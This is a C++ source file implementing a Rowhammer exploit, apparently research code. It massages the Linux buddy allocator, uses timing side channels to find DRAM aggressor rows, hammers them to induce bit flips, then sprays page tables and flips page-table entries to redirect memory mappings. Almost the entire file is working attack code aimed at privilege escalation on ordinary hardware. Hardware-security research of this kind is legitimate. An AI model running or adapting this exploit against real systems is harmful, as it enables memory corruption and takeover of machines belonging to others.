#include <sys/mman.h>
#include <unistd.h>
#include <sys/types.h>
#include <string>
#include <fstream>
#include <cstring>
#include <cstdlib>
#include <chrono>

#include "asm.h"
#include "utils.h"
#include "DRAMAddr.h"

int buddies_past = 0;

int read_buddyinfo(){
	int flag = 0;
	
	std::ifstream buddy_info1("/proc/buddyinfo");
	std::vector<std::string> buddies_current;

	if(buddy_info1.is_open()){
		std::string line;
		getline(buddy_info1, line); // zone DMA
		getline(buddy_info1, line); // zone DMA32
		while(getline(buddy_info1, line, ' ')){ // zone Normal
			if(line == "" || line == "\n") continue;
			buddies_current.push_back(line);
		}
	}
	buddy_info1.close();

	if(stoi(buddies_current[14]) == 0) return 0;
	
	if(buddies_past > stoi(buddies_current[14])) flag = 1;
	buddies_past = stoi(buddies_current[14]);

	if(flag == 1) return 1;
	else return 0;
}

void hammer_sync(std::vector<volatile char *> &aggressors, int acts,
                                      volatile char *d1, volatile char *d2) {
  size_t ref_rounds = 0;
  ref_rounds = std::max(1UL, acts/(aggressors.size()));
  size_t agg_rounds = ref_rounds;
  size_t before, after;
  size_t rounds = 0;

  for (size_t k = 0; k < aggressors.size(); k++) {
    clflush(aggressors[k]);
  }
  
  (void)*d1;
  (void)*d2;

  // synchronize with the beginning of an interval
  while (true) {
    clflush(d1);
    clflush(d2);
    mfence();
    before = rdtscp();
    lfence();
    (void)*d1;
    (void)*d2;
    after = rdtscp();
    // check if an REF was issued
    if ((after - before) > 900) {
      break;
    }
  }

	int n = 0;
	
	while(n < HAMMER_ROUNDS){
    for (size_t j = 0; j < agg_rounds; j++) {
			for (size_t k = 0; k < aggressors.size(); k++) {
        clflush(aggressors[k]);
      }
			for (size_t k = 0; k < aggressors.size(); k++) {
        (void)(*aggressors[k]);
      }
      mfence();
    }
  
    // after HAMMER_ROUNDS/ref_rounds times hammering, check for next ACTIVATE
    while (true) {
			n++;
      before = rdtscp();
      lfence();
			(void)*d1;
      clflush(d1);
			(void)*d2;
			clflush(d2);
      after = rdtscp();
      lfence();
      // stop if an ACTIVATE was issued
      if ((after - before) > 900) break;
			
    }
  }
}

size_t contiguous_memory(std::vector<volatile char *> &aggressors, 
																					int alloc_size, 
																					int num_rows,
																					int pmap_fd){

	bool to_open = false;

	if (pmap_fd == -1) {
		pmap_fd = open("/proc/self/pagemap", O_RDONLY);
		assert(pmap_fd >= 0);
		to_open = true;
	}
  
	std::ifstream buddy_info("/proc/buddyinfo");
	std::vector<std::string> buddies_current;
	std::vector<size_t> addresses;

	if(buddy_info.is_open()){
		std::string line;
		getline(buddy_info, line); // zone DMA
		getline(buddy_info, line); // zone DMA32
		while(getline(buddy_info, line, ' ')){ // zone Normal
			if(line == "" || line == "\n") continue;
			buddies_current.push_back(line);
		}
	}

	buddy_info.close();

	// Calculate # of 4KB pages to exhaust lower order buddies
	int num_pages = 1;
	for(int k = 4; k < 14; k++){
		// 10 is just margin
		if(stoi(buddies_current[k]) > 10) num_pages += (1<<(k-4)) * (stoi(buddies_current[k]) - 10);
	}

	fprintf(stderr, "Allocate %d pages\n", num_pages);

	// First, exhaust large # of 4KB pages
	auto mapped_target = mmap(NULL, 4096 * num_pages, PROT_READ | PROT_WRITE,
		MAP_SHARED | MAP_POPULATE | MAP_ANONYMOUS, 0, 0);

	if (mapped_target==MAP_FAILED) {
		perror("mmap");
		exit(EXIT_FAILURE);
	}

	int flag = read_buddyinfo(); // Find whether any available 2MB buddy exists

	// Second, exhaust a 4KB page per iter and check lower buddies are totally exhausted
	while(1){
		auto mapped_target = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
      MAP_SHARED | MAP_POPULATE | MAP_ANONYMOUS, 0, 0);

		if (mapped_target==MAP_FAILED) {
			perror("mmap");
			exit(EXIT_FAILURE);
		}

		addresses.push_back((size_t)mapped_target);

		flag = read_buddyinfo();

		if(flag == 1){
			fprintf(stderr, "Start allocate 2MB\n");
			break;
		} 
	}

	if(flag != 1){ // No available 2MB buddy
		for(auto address: addresses){
			munmap((char*)address, 4096);
		}
		exit(EXIT_FAILURE);
	}

	// Obtain 2MB contiguous memory region
	auto mapped_target1 = mmap(NULL, alloc_size, PROT_READ | PROT_WRITE,
      MAP_SHARED | MAP_POPULATE | MAP_ANONYMOUS, 0, 0);

	if (mapped_target1==MAP_FAILED) {
		perror("mmap");
		exit(EXIT_FAILURE);
	}

	// for(size_t tmp = (size_t)mapped_target1; tmp < (size_t)mapped_target1 + alloc_size; tmp += 4096){
	// 	fprintf(stderr, "VA: %lx, PA: %lx\n", tmp, get_phys_addr2(tmp, pmap_fd));
	// 	DRAMAddr aggr((char*)(tmp));
	// 	fprintf(stderr, "(VA, PA): (0x%lx, 0x%lx), row: %ld, bank: %ld\n", tmp, get_phys_addr2(tmp, pmap_fd), aggr.row, aggr.bank);
	// }

	//////////////////////////////////////////////////////////////////
	////////////////////   Find address offset   /////////////////////
	//////////////////////////////////////////////////////////////////

	uint64_t before;
	int check1, check2;
	int rounds = 100;

	size_t address_offset = 0;
	size_t tmp1 = 0;
	size_t num_try = 0;
	int no_offset = 1;

	// Find offset to find alligned start address
	while((address_offset == 0) && num_try < 100){
		for(tmp1 = (size_t)mapped_target1 + (num_try + 1) * 4096; tmp1 < (size_t)mapped_target1 + alloc_size; tmp1 += 0x40){
			uint64_t* time_vals = (uint64_t*) calloc(rounds, sizeof(uint64_t));
			for(int i = 0; i < rounds; i++){
				clflush((volatile void*)((int *)mapped_target1 + num_try * 4096));
				clflush((volatile void*)((int *)tmp1));
				mfence();
				before = rdtscp();
				lfence();
				check1 = *((int *)mapped_target1);
				check2 = *((int *)tmp1);
				time_vals[i] = rdtscp() - before; 
			}
			uint64_t mdn = median(time_vals, rounds);

			if((mdn > THRESH)) {
				address_offset = tmp1;
				no_offset = 0;
				break;
			}
			
			free(time_vals);
		}

		if(tmp1 < (size_t)mapped_target1 + alloc_size){
			num_try += 1;
		}
	}

	// Fail to find offset
	if(no_offset) return 0;

	//////////////////////////////////////////////////////////////////
	///////////////////   Find double-sided pair   ///////////////////
	//////////////////////////////////////////////////////////////////
	
	for(tmp1 = address_offset; tmp1 + 0x10000 < (size_t)mapped_target1 + alloc_size; tmp1 += 0x8000){
		uint64_t* time_vals = (uint64_t*) calloc(rounds, sizeof(uint64_t));
		for(int i = 0; i < rounds; i++){
			clflush((volatile void*)((int *)tmp1));
			clflush((volatile void*)((int *)(tmp1 + 0x10000)));
			mfence();
			before = rdtscp();
			lfence();
			check1 = *((int *)(tmp1));
			check2 = *((int *)(tmp1 + 0x10000));
			time_vals[i] = rdtscp() - before; 
		}
		uint64_t mdn = median(time_vals, rounds);

		if((mdn > THRESH)) {
			aggressors.push_back((volatile char *)((int *)tmp1)); 
			aggressors.push_back((volatile char *)((int *)(tmp1 + 0x10000)));
		}
		// fprintf(stderr, "1. base: (%p, 0x%lx), next: (0x%lx, 0x%lx), latency: %ld\n", tmp1, get_phys_addr2((size_t)tmp1, pmap_fd), 
		// 																																							tmp1+0x10000, get_phys_addr2((size_t)(tmp1+0x10000), pmap_fd), mdn);
		free(time_vals);
	}
	
	//////////////////////////////////////////////////////////////////
	////////////////////   Free allocated pages   ////////////////////
	//////////////////////////////////////////////////////////////////

	if (to_open) {
		close(pmap_fd);
	}

	for(auto address: addresses){
		munmap((char*)address, 4096);
	}

	munmap((char*)mapped_target, 4096 * num_pages);
	
	return (size_t)mapped_target1;
}


int find_dummies(std::vector<volatile char *> &dummies, 
																					volatile void *base,
																					int alloc_size, size_t address, 
																					int num_rows,
																					int pmap_fd){

	bool to_open = false;

	if (pmap_fd == -1) {
		pmap_fd = open("/proc/self/pagemap", O_RDONLY);
		assert(pmap_fd >= 0);
		to_open = true;
	}

	uint64_t before;
	int check1, check2;
	int rounds = 100;
	int stop = 0;

	for(size_t tmp = address; tmp < address + alloc_size; tmp += 4096){
		uint64_t* time_vals = (uint64_t*) calloc(rounds, sizeof(uint64_t));
		for(int i = 0; i < rounds; i++){
			clflush(base);
			clflush((volatile void*)((int *)tmp));
			mfence();
			before = rdtscp();
			lfence();
			check1 = *((int *)((size_t)base));
			check2 = *((int *)(tmp));
			time_vals[i] = rdtscp() - before; 
		}
		uint64_t mdn = median(time_vals, rounds);
		// fprintf(stderr, "mdn: %ld\n", mdn);
		if(dummies.size() >= num_rows){
			return 1; 
		} 
		else if((mdn > THRESH) && (stop < num_rows)) {
			dummies.push_back((volatile char *)((int *)tmp));
			tmp += 0x8000-4096;
			stop++;
		}
		// fprintf(stderr, "base: (%p, 0x%lx), next: (0x%lx, 0x%lx), latency: %ld\n", base_addr, get_phys_addr2((size_t)base_addr, pmap_fd), 
		// 																																							(int *)tmp, get_phys_addr2((size_t)(int *)tmp, pmap_fd), mdn);
		free(time_vals);
	}

	if (to_open) {
		close(pmap_fd);
	}

	return 0;
}

int main(int argc, char** argv){

	// Initialize DRAMAddr for DRAM addressing (DRAMAddr.cc)
	DRAMAddr::initialize(5, (volatile char *) 0x10000000000);
	std::cout << "hammering count: " << HAMMER_ROUNDS << std::endl;

	int pmap_fd = open("/proc/self/pagemap", O_RDONLY);
	assert(pmap_fd >= 0);

	// Huge page allocate (for comparing Marionette to baseline)
	// std::vector<size_t> huges;

	// for(int i = 0; i < 12; i++){
	// 	auto huge = mmap(NULL, 1024*1024*1024, PROT_READ | PROT_WRITE,
  //       MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB | (30UL << MAP_HUGE_SHIFT), -1, 0);
		
	// 	huges.push_back((size_t)huge);

	// 	for (uint64_t cur_page = 0; cur_page < 1024*1024*1024; cur_page += 4096) {
	// 		for (uint64_t cur_pageoffset = 0; cur_pageoffset < (uint64_t) 4096; cur_pageoffset += sizeof(int)) {
	// 			uint64_t offset = cur_page + cur_pageoffset;
	// 			auto p = (size_t)huge + offset;
	// 			*((int *) (p)) = 0x33333333;
	// 		}
	// 	}
	// }

	////////////////////////////////////////////////////////////////////
	///////////////////   Obtain contiguous memory   ///////////////////
	////////////////////////////////////////////////////////////////////
	std::vector<volatile char *> aggressors;
	std::vector<volatile char *> dummies;

	size_t num_rows = stoi(std::string(argv[1])); // # of dummy rows
	int allocate_size = (1<<21); // 2MB contiguou memory

	auto start = std::chrono::high_resolution_clock::now();
	size_t cont_start_addr = contiguous_memory(aggressors, allocate_size, num_rows, pmap_fd);

	if(!cont_start_addr) return 0; // Fail to find double-sided pairs

	std::vector<size_t> victim_addresses;

	int index = 0;
	int num_pages = 0;
	for(int i = 0; i < aggressors.size(); i+=2){

		while(1){
			if(num_pages == index){
				auto mapped_target1 = mmap(NULL, allocate_size, PROT_READ | PROT_WRITE,
					MAP_SHARED | MAP_POPULATE | MAP_ANONYMOUS, 0, 0);

				victim_addresses.push_back((size_t)mapped_target1);

				num_pages++;
			}

			int find_all = find_dummies(dummies, aggressors[i], allocate_size, victim_addresses[index], (i/2 + 1)*(num_rows - 2), pmap_fd);
			
			if(find_all){
				index = 0;
				break;
			}
			else index++;
		}
	}

	fprintf(stderr, "aggressors size: %ld, dummies size: %ld\n", aggressors.size(), dummies.size());

	auto finish = std::chrono::high_resolution_clock::now();

	std::cout << "contiguous memory: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;
	fprintf(stderr, "allocate %dMB chunks for dummy rows\n", num_pages * 2 + 2);

	/////////////////////////////////////////////////////
	//////////////   Prepare for compare   //////////////
	/////////////////////////////////////////////////////
	void *written_data_raw1 = malloc(4096);
	int *written_data1 = (int*)written_data_raw1;
	for (size_t j = 0; j < (unsigned long) 4096/sizeof(int); ++j)
		written_data1[j] = 0x80000007;

	void *written_data_raw2 = malloc(4096);
	int *written_data2 = (int*)written_data_raw2;
	for (size_t j = 0; j < (unsigned long) 4096/sizeof(int); ++j)
		written_data2[j] = 0x33333027;

	void *written_data_raw3 = malloc(4096);
	int *written_data3 = (int*)written_data_raw3;
	for (size_t j = 0; j < (unsigned long) 4096/sizeof(int); ++j)
		written_data3[j] = 0x80000000;

	void *written_data_raw4 = malloc(4096);
	int *written_data4 = (int*)written_data_raw4;
	for (size_t j = 0; j < (unsigned long) 4096/sizeof(int); ++j)
		written_data4[j] = 0xccccc027;

	/////////////////////////////////////////////////////
	////////   Attack prepared aggressor rows   /////////
	/////////////////////////////////////////////////////
	int num_tries = 0;

	for(int aggr_idx = 0; aggr_idx < aggressors.size(); aggr_idx+=2){
		std::vector<volatile char *> sub_aggressors;
		sub_aggressors.push_back(aggressors[aggr_idx]);
		sub_aggressors.push_back(aggressors[aggr_idx+1]);

		std::vector<volatile char *> sub_dummies;
		for(int dum_idx = (aggr_idx/2) * (num_rows - 2); dum_idx < (aggr_idx/2 + 1) * (num_rows - 2); dum_idx++){
			sub_dummies.push_back(dummies[dum_idx]);
		}

		for(auto aggressor: sub_aggressors){
			DRAMAddr aggr((char*)((size_t)aggressor));
			fprintf(stderr, "Find! aggr: (0x%lx, 0x%lx), row: %ld, bank: %ld\n", (size_t)aggressor, get_phys_addr2((size_t)aggressor, pmap_fd), aggr.row, aggr.bank);
		}

		for(auto aggressor: sub_dummies){
			DRAMAddr aggr((char*)((size_t)aggressor));
			fprintf(stderr, "Find! dummy: (0x%lx, 0x%lx), row: %ld, bank: %ld\n", (size_t)aggressor, get_phys_addr2((size_t)aggressor, pmap_fd), aggr.row, aggr.bank);
		}

		std::vector<size_t> bitflips;
		std::vector<size_t> outliers;
		int repeat = 0;
		int retry = 0;
		
		num_tries++;
		/////////////////////////////////////////////////////
		////////////////////   Phase 1   ////////////////////
		/////////////////////////////////////////////////////
		do{
			repeat ++;
			retry = 0;

			/////////////////////////////////////////////////////
			///////////   Write data pattern again   ////////////
			/////////////////////////////////////////////////////
			size_t remain = 0;
			for(size_t i = 0; i + 4096 < allocate_size; i += 4096){
				for(size_t j = 0; j < 4096; j+=sizeof(int)){
					if((j/4) % 2 == 0) *((int *)(cont_start_addr+i+j)) = 0x80000007;
					else *((int *)(cont_start_addr+i+j)) = 0x33333027;
					clflush((volatile char *)(int *)(cont_start_addr+i+j));
				}
				remain = i;
			}

			for(size_t i = remain + 4096; i < allocate_size; i+=sizeof(int)){
				if((i/4) % 2 == 0) *((int *)(cont_start_addr+i)) = 0x80000007;
				else *((int *)(cont_start_addr+i)) = 0x33333027;
				clflush((volatile char *)(int *)(cont_start_addr+i));
			}

			for(size_t i = 0; i < sub_aggressors.size(); i++){
				for(size_t j = 0; j < 0x8000; j += sizeof(int)){
					if((size_t)sub_aggressors[i]+j >= cont_start_addr + allocate_size) break;
					if((j/4) % 2 == 0) *((int *)((size_t)sub_aggressors[i]+j)) = 0x80000000;
					else *((int *)((size_t)sub_aggressors[i]+j)) = 0xccccc027;
				}
			}
			
			///////////////////////////////////////////////////////
			////////////////////   Hammering   ////////////////////
			///////////////////////////////////////////////////////
			fprintf(stderr, "Attack start\n");
			start = std::chrono::high_resolution_clock::now();

			hammer_sync(sub_dummies, 56, sub_aggressors[0], sub_aggressors[1]);

			finish = std::chrono::high_resolution_clock::now();
			fprintf(stderr, "Attack finish\n");

			std::cout << "attack time: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;

			/////////////////////////////////////////////////////////
			///////////////////   Find bitflips   ///////////////////
			/////////////////////////////////////////////////////////
			int pass = 0;

			fprintf(stderr, "Compare start\n");
			start = std::chrono::high_resolution_clock::now();
			
			for(size_t i = cont_start_addr; i < cont_start_addr + allocate_size; i += sizeof(int)){
				if(*((int *)(i)) == 0x80000007 || *((int *)(i)) == 0x33333027) continue;
				for(int k = 0; k < sub_aggressors.size(); k++){
					if((i >= (size_t)sub_aggressors[k]) && (i < ((size_t)sub_aggressors[k] + 0x8000))){
						pass = 1;
						break;
					} 
				}

				if(pass == 1){
					pass = 0;
					continue;
				}

				int expected_rand_value;
				if((i/4) % 2 == 0) expected_rand_value = written_data1[(i % 4096) / sizeof(int)];
				else expected_rand_value = written_data2[(i % 4096) / sizeof(int)];
				fprintf(stderr, "Flipped data from 0x%x to 0x%x\n", expected_rand_value, *((int *)(i)));
				for (size_t c = 0; c < sizeof(int); c++) {
					volatile char *flipped_address = (volatile char *)(i + c);
					if (*flipped_address != ((char *) &expected_rand_value)[c]) {

						if((i/4) % 2 == 1 && c >= 1) {
							retry = 1;
							bitflips.push_back((size_t)flipped_address);
						}
						else{
							outliers.push_back((size_t)flipped_address);
						}

						const auto flipped_addr_value = *(unsigned char *) flipped_address;
						const auto expected_value = ((unsigned char *) &expected_rand_value)[c];

						fprintf(stderr, "Flip at %p, %ldth bit, from 0x%x to 0x%x\n", flipped_address, c, expected_value, flipped_addr_value);
					}
				}
			}
			finish = std::chrono::high_resolution_clock::now();

			std::cout << "compare time: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;
			fprintf(stderr, "Compare finish\n");

		} while(retry && repeat < 10);

		std::vector<size_t> tmp_flippable_addr;
		int exist = find_flippable(bitflips, tmp_flippable_addr, 7);

		/////////////////////////////////////////////////////
		////////////////////   Phase 2   ////////////////////
		/////////////////////////////////////////////////////
		if(exist){
			fprintf(stderr, "Phase 2 start!\n");
			repeat = 0;
			retry = 0;

			do{
				repeat ++;
				retry = 0;

				/////////////////////////////////////////////////////
				///////////   Write data pattern again   ////////////
				/////////////////////////////////////////////////////
				for(size_t i = 0; i < allocate_size; i += 4096){
					for(size_t j = 0; j < 4096; j+=sizeof(int)){
						if((j/4) % 2 == 0) *((int *)(cont_start_addr+i+j)) = 0x80000000;
						else *((int *)(cont_start_addr+i+j)) = 0xccccc027;
						clflush((volatile char *)(int *)(cont_start_addr+i+j));
					}
				}

				for(size_t i = 0; i < sub_aggressors.size(); i++){
					for(size_t j = 0; j < 0x8000; j += sizeof(int)){
						if((size_t)sub_aggressors[i]+j > cont_start_addr + allocate_size) break;
						if((j/4) % 2 == 0) *((int *)((size_t)sub_aggressors[i]+j)) = 0x80000007;
						else *((int *)((size_t)sub_aggressors[i]+j)) = 0x33333027;
					}
				}

				///////////////////////////////////////////////////////
				////////////////////   Hammering   ////////////////////
				///////////////////////////////////////////////////////
				fprintf(stderr, "Attack start\n");
				start = std::chrono::high_resolution_clock::now();

				hammer_sync(sub_dummies, 56, sub_aggressors[0], sub_aggressors[1]);

				finish = std::chrono::high_resolution_clock::now();
				fprintf(stderr, "Attack finish\n");

				std::cout << "attack time: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;

				/////////////////////////////////////////////////////////
				///////////////////   Find bitflips   ///////////////////
				/////////////////////////////////////////////////////////
				int pass = 0;

				fprintf(stderr, "Compare start\n");
				start = std::chrono::high_resolution_clock::now();
				
				for(size_t i = cont_start_addr; i < cont_start_addr + allocate_size; i += sizeof(int)){
					if(*((int *)(i)) == 0x80000000 || *((int *)(i)) == 0xccccc027) continue;
					for(int k = 0; k < sub_aggressors.size(); k++){
						if((i >= (size_t)sub_aggressors[k]) && (i < ((size_t)sub_aggressors[k] + 0x8000))){
							pass = 1;
							break;
						} 
					}

					if(pass == 1){
						pass = 0;
						continue;
					}
					
					int expected_rand_value;
					if((i/4) % 2 == 0) expected_rand_value = written_data3[(i % 4096) / sizeof(int)];
					else expected_rand_value = written_data4[(i % 4096) / sizeof(int)];
					fprintf(stderr, "Flipped data from 0x%x to 0x%x\n", expected_rand_value, *((int *)(i)));
					for (size_t c = 0; c < sizeof(int); c++) {
						volatile char *flipped_address = (volatile char *)(i + c);
						if (*flipped_address != ((char *) &expected_rand_value)[c]) {

							if((i/4) % 2 == 1 && c >= 1) {
								retry = 1;
								bitflips.push_back((size_t)flipped_address);
							}
							else{
								outliers.push_back((size_t)flipped_address);
							}

							const auto flipped_addr_value = *(unsigned char *) flipped_address;
							const auto expected_value = ((unsigned char *) &expected_rand_value)[c];

							fprintf(stderr, "Flip at %p, %ldth bit, from 0x%x to 0x%x\n", flipped_address, c, expected_value, flipped_addr_value);
						}
					}
				}
				finish = std::chrono::high_resolution_clock::now();

				std::cout << "compare time: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;
				fprintf(stderr, "Compare finish\n");
			
			} while(retry && repeat < 10);
		}
		
		std::vector<size_t> flippable_addr;
		exist = find_flippable(bitflips, flippable_addr, 7);

		std::vector<size_t> outliers_addr;
		find_outliers(outliers, outliers_addr);

		std::vector<size_t> file_mapped_addrs;

		if(exist){
			
			fprintf(stderr, "num_tries: %d\n", num_tries);
			num_tries = 0;

			int cont1 = 0;
			int cont2 = 0;

			for(auto addr: flippable_addr){
				cont1 = 0;

				for(auto outlier: outliers_addr){
					if(outlier == addr){
						cont1 = 1;
						break;
					}
				}

				if(cont1) continue;
				cont2 = 1;
				fprintf(stderr, "Flippable page: 0x%lx\n", addr);
				munmap((char*)(addr), 4096);
			}

			if(!cont2){
				continue;
			}

			/////////////////////////////////////////////////////////
			////////////////   Page table spraying   ////////////////
			/////////////////////////////////////////////////////////
			int fd;

			if((fd = open("/dev/shm/feed", O_RDWR)) < 0){
				perror("File Open Error");
				exit(1);
			}

			int num_pages = (1<<13) + (1<<12) + (1<<10) + (1<<9);
			// int num_pages = (1<<12) + (1<<11) + (1<<10) + (1<<9); // Huge
			size_t alloc_size = (1<<30);

			fprintf(stderr, "Spraying start\n");
			start = std::chrono::high_resolution_clock::now();

			for(int i = 0; i < num_pages; i++){
				auto mapped_target = mmap(NULL, alloc_size, PROT_READ | PROT_WRITE,
					MAP_SHARED | MAP_POPULATE, fd, 0); // 2MB page table per mapping

				if (mapped_target==MAP_FAILED) {
					perror("mmap");
					exit(EXIT_FAILURE);
				}
				file_mapped_addrs.push_back((size_t)mapped_target);
			}

			finish = std::chrono::high_resolution_clock::now();
			std::cout << "spraying time: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;
			fprintf(stderr, "Spraying finish\n");

			/////////////////////////////////////////////////////////////////
			//////////////////////////   Attack   ///////////////////////////
			/////////////////////////////////////////////////////////////////
			fprintf(stderr, "Start flipping PTE\n");
			hammer_sync(sub_dummies, 56, sub_aggressors[0], sub_aggressors[1]);

			/////////////////////////////////////////////////////////////////
			//////////////////   Verify PTE corruption   ////////////////////
			/////////////////////////////////////////////////////////////////
			fprintf(stderr, "Verify bitflips\n");
			for(int i = 0; i < num_pages; i++){
				for(size_t tmp = 0; tmp < 1024*1024*1024; tmp += 4096){
					if(*((char *) (file_mapped_addrs[i] + tmp)) != '2'){
						fprintf(stderr, "Pointing data: 0x%lx\n", *((size_t *) (file_mapped_addrs[i] + tmp)));
						// *((size_t *) (addresses[i] + tmp)) = 0x80000000a6ed5037;
						// for(int i = 0; i < num_pages; i++){
						//   munmap((char*)addresses[i], alloc_size);
						// }
						// return;
					}
				}
			}
			fprintf(stderr, "Verify finish\n");

			finish = std::chrono::high_resolution_clock::now();
			std::cout << "S3 time: " << std::chrono::duration_cast<std::chrono::nanoseconds>(finish-start).count() << std::endl;
			fprintf(stderr, "S3 finish\n");
		}

		/////////////////////////////////////////////////////////////////
		/////////////////   Free page table spraying   //////////////////
		/////////////////////////////////////////////////////////////////
		for(auto address: file_mapped_addrs){
			munmap((char*)address, (1<<30));
		}
	}

	/////////////////////////////////////////////////////////////////
	///////////////////   Free allocated memory   ///////////////////
	/////////////////////////////////////////////////////////////////
	for(auto address: victim_addresses){
		munmap((char*)address, allocate_size);
	}

	munmap((char*)(cont_start_addr), allocate_size);

	// Huge page free
	// for(auto address: huges){
	// 	munmap((char*)address, 1024*1024*1024);
	// }

	close(pmap_fd);
	fprintf(stderr, "#########################\n");

	return 0;
}